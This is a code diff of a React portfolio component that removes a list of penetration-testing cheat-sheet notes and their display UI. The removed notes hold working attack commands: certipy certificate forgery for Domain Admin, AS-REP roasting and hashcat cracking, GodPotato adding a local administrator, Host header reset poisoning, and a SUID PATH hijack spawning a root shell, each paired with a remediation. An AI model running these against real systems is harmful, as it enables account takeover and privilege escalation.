@@ -1,143 +1,13 @@
 "use client";
 
-import React, { useState } from "react";
-import { motion, AnimatePresence } from "framer-motion";
+import React from "react";
+import { motion } from "framer-motion";
 import Link from "next/link";
-import {
-  ArrowUpRight,
-  BookOpen,
-  ChevronRight,
-  X,
-} from "lucide-react";
+import { ArrowUpRight, ChevronRight } from "lucide-react";
 import { soundManager } from "@/lib/audio";
 import { writeups } from "@/lib/writeups";
 
-// Technical Notes with MITRE ATT&CK mapping inspired by penguin-portfolio
-export interface ResearchNote {
-  id: string;
-  num: string;
-  title: string;
-  category: string;
-  mitre: string;
-  os: "Windows" | "Linux" | "Multi-Platform";
-  difficulty: "Easy" | "Medium" | "Hard";
-  date: string;
-  summary: string;
-  keySteps: string[];
-  remediation: string;
-}
-
-const RESEARCH_NOTES: ResearchNote[] = [
-  {
-    id: "note-01",
-    num: "01",
-    title: "ESC1 AD CS Certificate Template Exploitation",
-    category: "Active Directory",
-    mitre: "T1649 - Steal or Forge Authentication Certificates",
-    os: "Windows",
-    difficulty: "Hard",
-    date: "Jul 2026",
-    summary:
-      "When a certificate template has ENROLLEE_SUPPLIES_SUBJECT enabled along with Client Authentication EKU, any low-privilege domain user can request a certificate on behalf of Domain Admin (e.g., Administrator), harvesting the PFX and obtaining a TGT ticket via PKINIT.",
-    keySteps: [
-      "Enumerate vulnerable templates with Certify.exe or certipy find -vulnerable",
-      "Request certificate specifying alt name: certipy req -u user@corp.local -p pass -target ca.corp.local -template VulnerableESC1 -upn administrator@corp.local",
-      "Authenticate with PKINIT to receive Administrator TGT: certipy auth -pfx administrator.pfx",
-    ],
-    remediation:
-      "Disable 'Supply in the request' flag on certificate templates (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) unless strictly required.",
-  },
-  {
-    id: "note-02",
-    num: "02",
-    title: "Kerberos AS-REP Roasting & Pre-Auth Downgrade",
-    category: "Identity & Kerberos",
-    mitre: "T1558.004 - Kerberos AS-REP Roasting",
-    os: "Windows",
-    difficulty: "Medium",
-    date: "Jul 2026",
-    summary:
-      "Accounts configured with DONT_REQ_PREAUTH allow any network attacker to query the KDC for an AS-REP ticket without providing credentials. The encrypted timestamp portion can be cracked offline with Hashcat mode 18200.",
-    keySteps: [
-      "Discover accounts without pre-auth: GetNPUsers.py telecom.local/ -no-pass -usersfile users.txt",
-      "Format raw Kerberos AS-REP hash string",
-      "Crack offline using wordlist: hashcat -m 18200 asrep_hashes.txt rockyou.txt",
-    ],
-    remediation:
-      "Ensure 'Do not require Kerberos preauthentication' is unchecked on all Active Directory user accounts.",
-  },
-  {
-    id: "note-03",
-    num: "03",
-    title: "GodPotato: SeImpersonatePrivilege on Windows Server",
-    category: "Privilege Escalation",
-    mitre: "T1134 - Access Token Manipulation",
-    os: "Windows",
-    difficulty: "Medium",
-    date: "Jul 2026",
-    summary:
-      "Bypasses RPC restrictions on Windows Server 2019/2022 where traditional JuicyPotato fails. Abuses DCOM activation and hook RPC to capture SYSTEM token via fake pipe server.",
-    keySteps: [
-      "Verify SeImpersonatePrivilege via whoami /priv on service account (e.g., IIS_IUSRS or MSSQL)",
-      "Deploy GodPotato binary: GodPotato.exe -cmd \"cmd.exe /c net user hacker Pass123! /add && net localgroup administrators hacker /add\"",
-      "Verify elevated admin group membership",
-    ],
-    remediation:
-      "Restrict service accounts from running interactive shells and assign least-privilege service configurations.",
-  },
-  {
-    id: "note-04",
-    num: "04",
-    title: "Host Header Injection & Password Reset Poisoning",
-    category: "Web Security",
-    mitre: "T1552 - Unsecured Credentials",
-    os: "Multi-Platform",
-    difficulty: "Easy",
-    date: "Aug 2026",
-    summary:
-      "Web applications that dynamically construct password reset URLs using the HTTP Host header allow an attacker to poison the link generated in emails, capturing the raw password reset token when clicked or logged.",
-    keySteps: [
-      "Intercept POST /forgot-password request via Burp Suite",
-      "Replace Host header with attacker-controlled collaborator / request catcher URL",
-      "Observe application echoing injected host into email verification token path",
-      "Extract token from public catcher logs and submit new password",
-    ],
-    remediation:
-      "Hardcode the canonical domain name in server configuration rather than trusting the incoming client Host header.",
-  },
-  {
-    id: "note-05",
-    num: "05",
-    title: "SUID Binary PATH Hijacking & Dynamic Linker Abuse",
-    category: "Linux Exploitation",
-    mitre: "T1548.001 - Setuid and Setgid",
-    os: "Linux",
-    difficulty: "Easy",
-    date: "Jun 2026",
-    summary:
-      "When a SUID binary invokes a system utility (such as cat or service) without specifying an absolute path (/bin/cat), an unprivileged user can prepend a malicious script directory to the PATH variable to hijack code execution under root privileges.",
-    keySteps: [
-      "Identify SUID binaries: find / -perm -4000 2>/dev/null",
-      "Run strings or ltrace on target binary to identify unqualified commands: strings /usr/bin/bugtracker",
-      "Create malicious payload: echo '/bin/bash -p' > /tmp/cat && chmod +x /tmp/cat",
-      "Prepend to PATH: export PATH=/tmp:$PATH and execute the SUID tool",
-    ],
-    remediation:
-      "Always specify absolute executable paths in custom compiled C/C++ or shell scripts with SUID permissions.",
-  },
-];
-
 export default function PenguinEditorial() {
-  const [selectedNote, setSelectedNote] = useState<ResearchNote | null>(null);
-  const [activeFilter, setActiveFilter] = useState<string>("ALL");
-
-  const filteredNotes = RESEARCH_NOTES.filter((note) => {
-    if (activeFilter === "ALL") return true;
-    if (activeFilter === "WINDOWS") return note.os === "Windows";
-    if (activeFilter === "LINUX") return note.os === "Linux";
-    return true;
-  });
-
   return (
     <section className="py-24 px-4 bg-[#07070b] relative overflow-hidden" id="editorial">
       
@@ -164,7 +34,7 @@ export default function PenguinEditorial() {
       <div className="max-w-5xl mx-auto relative z-10">
         
         {/* MANIFESTO HEADER INSPIRED BY PENGUIN-PORTFOLIO */}
-        <div className="mb-16">
+        <div className="mb-14">
           <div className="flex items-center gap-3 text-xs font-mono text-[#ff1a2e] mb-3 uppercase tracking-[0.25em]">
             <span>彼岸花 // RED SPIDER LILY</span>
             <span>•</span>
@@ -180,8 +50,8 @@ export default function PenguinEditorial() {
           </p>
         </div>
 
-        {/* SECTION A: SELECTED WRITEUPS GRID (PENGUIN STYLE) */}
-        <div className="mb-20">
+        {/* SELECTED WRITEUPS GRID */}
+        <div>
           <div className="flex items-center justify-between pb-4 mb-8 border-b border-white/5">
             <div className="flex items-center gap-2">
               <span className="font-deathnote text-2xl text-white tracking-wide">
@@ -285,194 +155,7 @@ export default function PenguinEditorial() {
           </div>
         </div>
 
-        {/* SECTION B: RECENT TECHNICAL RESEARCH NOTES (PENGUIN STYLE) */}
-        <div>
-          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 pb-4 mb-6 border-b border-white/5">
-            <div>
-              <div className="flex items-center gap-2">
-                <BookOpen size={18} className="text-[#ff1a2e]" />
-                <h3 className="font-deathnote text-2xl text-white tracking-wide">
-                  RECENT TECHNICAL NOTES
-                </h3>
-              </div>
-              <span className="text-xs font-mono text-gray-400 mt-1 block">
-                Concise operational cheat-sheets, exploitation chains, and defensive remediations.
-              </span>
-            </div>
-
-            {/* Filter pills */}
-            <div className="flex items-center gap-1.5">
-              {["ALL", "WINDOWS", "LINUX"].map((f) => (
-                <button
-                  key={f}
-                  onClick={() => {
-                    soundManager.playTick();
-                    setActiveFilter(f);
-                  }}
-                  className={`px-3 py-1 rounded-full text-xs font-mono transition-colors ${
-                    activeFilter === f
-                      ? "bg-[#ff1a2e] text-white font-bold"
-                      : "bg-white/5 text-gray-400 hover:text-white"
-                  }`}
-                >
-                  {f}
-                </button>
-              ))}
-            </div>
-          </div>
-
-          {/* Clean Editorial Notes List */}
-          <div className="double-bezel overflow-hidden">
-            <div className="double-bezel-inner divide-y divide-white/5">
-              {filteredNotes.map((note) => (
-                <div
-                  key={note.id}
-                  onClick={() => {
-                    soundManager.playTick();
-                    setSelectedNote(note);
-                  }}
-                  onMouseEnter={() => soundManager.playTick()}
-                  className="p-5 sm:p-6 flex flex-col md:flex-row md:items-center justify-between gap-4 hover:bg-white/[0.025] transition-colors cursor-pointer group"
-                >
-                  <div className="flex items-start md:items-center gap-4">
-                    <span className="font-deathnote text-xl text-[#ff1a2e] font-bold shrink-0 pt-0.5 md:pt-0 w-8">
-                      {note.num}
-                    </span>
-                    <div>
-                      <div className="flex items-center gap-2 flex-wrap">
-                        <h4 className="font-deathnote text-base sm:text-lg text-white group-hover:text-[#ff1a2e] transition-colors tracking-wide">
-                          {note.title}
-                        </h4>
-                        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white/5 border border-white/10 text-gray-300">
-                          {note.os}
-                        </span>
-                        <span className="text-[10px] font-mono text-[#ff1a2e]">
-                          [{note.mitre.split(" - ")[0]}]
-                        </span>
-                      </div>
-                      <p className="font-mono text-xs text-gray-400 mt-1 max-w-2xl line-clamp-1">
-                        {note.summary}
-                      </p>
-                    </div>
-                  </div>
-
-                  <div className="flex items-center justify-between md:justify-end gap-4 text-xs font-mono text-gray-500 shrink-0">
-                    <span>{note.date}</span>
-                    <div className="w-8 h-8 rounded-full border border-white/10 group-hover:border-[#ff1a2e] group-hover:bg-[#ff1a2e] flex items-center justify-center text-gray-400 group-hover:text-white transition-all">
-                      <ArrowUpRight size={13} />
-                    </div>
-                  </div>
-                </div>
-              ))}
-            </div>
-          </div>
-
-        </div>
-
       </div>
-
-      {/* INTERACTIVE TECHNICAL NOTE MODAL */}
-      <AnimatePresence>
-        {selectedNote && (
-          <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
-            <motion.div
-              initial={{ opacity: 0, scale: 0.95, y: 10 }}
-              animate={{ opacity: 1, scale: 1, y: 0 }}
-              exit={{ opacity: 0, scale: 0.95, y: 10 }}
-              className="double-bezel max-w-2xl w-full"
-            >
-              <div className="double-bezel-inner p-6 sm:p-8 bg-[#09090e] max-h-[85vh] overflow-y-auto">
-                
-                {/* Modal Header */}
-                <div className="flex items-start justify-between pb-4 mb-4 border-b border-white/5">
-                  <div>
-                    <div className="flex items-center gap-2 text-xs font-mono text-[#ff1a2e] mb-1">
-                      <span>RESEARCH NOTE // 0x{selectedNote.num}</span>
-                      <span>•</span>
-                      <span>{selectedNote.category}</span>
-                    </div>
-                    <h3 className="font-deathnote text-2xl text-white tracking-wide">
-                      {selectedNote.title}
-                    </h3>
-                  </div>
-                  
-                  <button
-                    onClick={() => {
-                      soundManager.playTick();
-                      setSelectedNote(null);
-                    }}
-                    className="p-1.5 rounded-lg bg-white/5 border border-white/10 hover:border-[#ff1a2e] text-gray-400 hover:text-white transition-colors"
-                  >
-                    <X size={16} />
-                  </button>
-                </div>
-
-                {/* MITRE ATT&CK & Metadata */}
-                <div className="flex flex-wrap gap-2 mb-6">
-                  <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-[#ff1a2e]/10 border border-[#ff1a2e]/30 text-[#ff1a2e] font-semibold">
-                    MITRE: {selectedNote.mitre}
-                  </span>
-                  <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-white/5 border border-white/10 text-gray-300">
-                    Platform: {selectedNote.os}
-                  </span>
-                  <span className="text-[11px] font-mono px-2.5 py-1 rounded bg-white/5 border border-white/10 text-gray-300">
-                    Difficulty: {selectedNote.difficulty}
-                  </span>
-                </div>
-
-                {/* Technical Overview */}
-                <div className="mb-6">
-                  <h4 className="text-xs font-mono uppercase text-gray-400 tracking-wider mb-2">
-                    EXPLOITATION SUMMARY
-                  </h4>
-                  <p className="font-sans text-sm text-gray-200 leading-relaxed bg-black/40 p-4 rounded-xl border border-white/5">
-                    {selectedNote.summary}
-                  </p>
-                </div>
-
-                {/* Execution Kill Chain */}
-                <div className="mb-6">
-                  <h4 className="text-xs font-mono uppercase text-gray-400 tracking-wider mb-2">
-                    ATTACK EXECUTION STEPS
-                  </h4>
-                  <div className="space-y-2">
-                    {selectedNote.keySteps.map((step, idx) => (
-                      <div key={idx} className="p-3 rounded-lg bg-black/60 border border-white/5 font-mono text-xs text-gray-300 flex items-start gap-2.5">
-                        <span className="text-[#ff1a2e] font-bold">{idx + 1}.</span>
-                        <code className="text-gray-200 break-all">{step}</code>
-                      </div>
-                    ))}
-                  </div>
-                </div>
-
-                {/* Remediation & Hardening */}
-                <div className="mb-6">
-                  <h4 className="text-xs font-mono uppercase text-[#ff1a2e] tracking-wider mb-2">
-                    DEFENSIVE MITIGATION // HARDENING
-                  </h4>
-                  <p className="font-sans text-xs text-gray-300 leading-relaxed bg-[#ff1a2e]/5 p-3.5 rounded-lg border border-[#ff1a2e]/20">
-                    {selectedNote.remediation}
-                  </p>
-                </div>
-
-                <div className="pt-4 border-t border-white/5 flex items-center justify-between text-xs font-mono text-gray-500">
-                  <span>DEEP FORENSIC CODEX</span>
-                  <button
-                    onClick={() => {
-                      soundManager.playTick();
-                      setSelectedNote(null);
-                    }}
-                    className="text-[#ff1a2e] hover:underline"
-                  >
-                    [ CLOSE NOTE ]
-                  </button>
-                </div>
-
-              </div>
-            </motion.div>
-          </div>
-        )}
-      </AnimatePresence>
 
     </section>
   );
